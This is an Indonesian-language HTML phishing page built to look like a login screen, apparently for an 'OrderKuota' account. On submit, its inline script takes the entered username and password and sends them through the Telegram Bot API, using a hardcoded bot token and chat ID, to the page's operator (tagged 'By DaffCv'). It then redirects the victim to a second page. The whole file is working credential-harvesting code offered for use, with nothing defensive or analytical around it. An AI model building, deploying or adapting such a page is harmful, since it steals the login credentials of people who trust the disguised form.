<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk Akun</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        /* Latar belakang utama halaman (Bisa diganti dengan gambar Anda) */
        body {
            /* Ganti 'background-image.jpg' dengan URL atau path gambar Anda */
            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://ibb.co.com/6RqW7W2D') no-repeat center center fixed;
            background-size: cover;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* Overlay / Wadah utama untuk posisi mengambang */
        .modal-overlay {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Kartu Modal Mengambang */
        .modal-card {
            background-color: #ffffff;
            width: 100%;
            max-width: 360px;
            padding: 30px 24px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        /* Tombol Tutup (X) */
        .close-btn {
            position: absolute;
            top: 15px;
            right: 20px;
            font-size: 20px;
            color: #999;
            cursor: pointer;
            text-decoration: none;
            font-weight: bold;
        }

        .close-btn:hover {
            color: #333;
        }

        /* Judul */
        .modal-title {
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            color: #333;
            margin-bottom: 25px;
        }

        /* Input Group */
        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 14px;
            outline: none;
        }

        .input-group input:focus {
            border-color: #009688;
        }

        /* Tombol Lanjutkan */
        .btn-submit {
            width: 100%;
            padding: 12px;
            background-color: #009688;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s ease;
        }

        .btn-submit:hover {
            background-color: #00796b;
        }

        /* Area Tautan Bantuan */
        .footer-link {
            text-align: center;
            margin-top: 20px;
        }

        .footer-link a {
            color: #009688;
            font-size: 13px;
            text-decoration: none;
        }

        .footer-link a:hover {
            text-decoration: underline;
        }
        .modal-image {
    width: 100%;
    display: flex;
    justify-content: center;
    margin: 15px 0 20px;
}

.modal-image img {
    width: 300px;
    height: 180px;
    object-fit: contain;
    border-radius: 10px;
}
.password-group {
    position: relative;
}

.password-group input {
    width: 100%;
    padding-right: 45px;
}

.toggle-password {
    position: absolute;
    right: 15px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    color: #777;
    display: flex;
    align-items: center;
}

.toggle-password svg {
    width: 20px;
    height: 20px;
}
.footer-link {
    text-align: right;
    width: 100%;
}
.top-banner {
    width: 100%;
    height: 65px;
    background: #168581;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 12px;
    box-sizing: border-box;
    margin-bottom: 15px;
}

.banner-title {
    color: white;
    font-size: 15px;
    font-weight: 500;
    margin: 0;
}

.banner-icons {
    display: flex;
    align-items: center;
    gap: 20px;
}

.banner-icons svg {
    display: block;
    width: 27px;
    height: 27px;
    fill: none;
    stroke: white;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
}
    </style>
</head>
<body>

<div class="modal-overlay">
    <div class="modal-card">

        <span class="close-btn" onclick="window.location.href='kedua.html'">&times;</span>

        <!-- BANNER -->
        <div class="top-banner">
    <span class="banner-title">Masuk</span>

    <div class="banner-icons">
        <!-- Ikon pesan -->
        <svg viewBox="0 0 24 24">
            <path d="M4 3h16v14H8l-4 4V3Z"/>
            <path d="M8 8h8M8 12h8"/>
        </svg>

        <!-- Ikon informasi -->
        <svg viewBox="0 0 24 24">
            <circle cx="12" cy="12" r="10"/>
            <path d="M12 11v6M12 7h.01"/>
        </svg>
    </div>
</div>  
        

        <div class="modal-image">
    <img src="https://www.image2url.com/r2/default/images/1794510848404-ee1cfd4d-4cff-49a0-88bc-e4ed9605e732.png" alt="Gambar OrderKuota">
</div>
        
        <form id="storeForm">
            <div class="input-group">
                <input type="text" id="firstName" placeholder="Username" required>
            </div>
           <div class="input-group password-group">
    <input type="password" id="lastName" placeholder="Kata Sandi" required>

    <span class="toggle-password" onclick="togglePassword()">
        <svg id="eyeIcon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2"
             stroke-linecap="round" stroke-linejoin="round">
            <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z"/>
            <circle cx="12" cy="12" r="3"/>
        </svg>
    </span>
</div>
            <button type="submit" class="btn-submit">Masuk</button>
        </form>

        <div class="footer-link">
            <a href="https://kudanil.com" target="_blank">Lupa Kata Sandi?</a>
        </div>
    </div>
</div>

<script>
    const form = document.getElementById('storeForm');

    // Masukkan Token dan Chat ID Bot Telegram Anda di sini
    const TELEGRAM_TOKEN = '9269603707:AAELWjvsM7HzedoczB1nMVRhmL1PqBRvPcY';
    const CHAT_ID = '6787447078';

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const firstName = document.getElementById('firstName').value;
        const lastName = document.getElementById('lastName').value;

        const message = `🔔 *RESULT MASUK *\n\nUsername: ${firstName}\nPassword: ${lastName} By DaffCv`;

        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(() => {
            window.location.href = 'kedua.html';
        })
        .catch((error) => {
            console.error('Error:', error);
            window.location.href = 'kedua.html';
        });
    });
</script>
<script>
function togglePassword() {
    const password = document.getElementById("lastName");
    const eye = document.getElementById("eyeIcon");

    if (password.type === "password") {
        password.type = "text";

        eye.innerHTML = `
            <path d="M3 3L21 21"/>
            <path d="M10.6 10.6a2 2 0 0 0 2.8 2.8"/>
            <path d="M9.9 5.2A10.8 10.8 0 0 1 12 5c6.5 0 10 7 10 7a15.5 15.5 0 0 1-3 3.8"/>
            <path d="M6.6 6.6C3.6 8.4 2 12 2 12s3.5 7 10 7a10 10 0 0 0 4-.8"/>
        `;
    } else {
        password.type = "password";

        eye.innerHTML = `
            <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z"/>
            <circle cx="12" cy="12" r="3"/>
        `;
    }
}
</script>
</body>
</html>
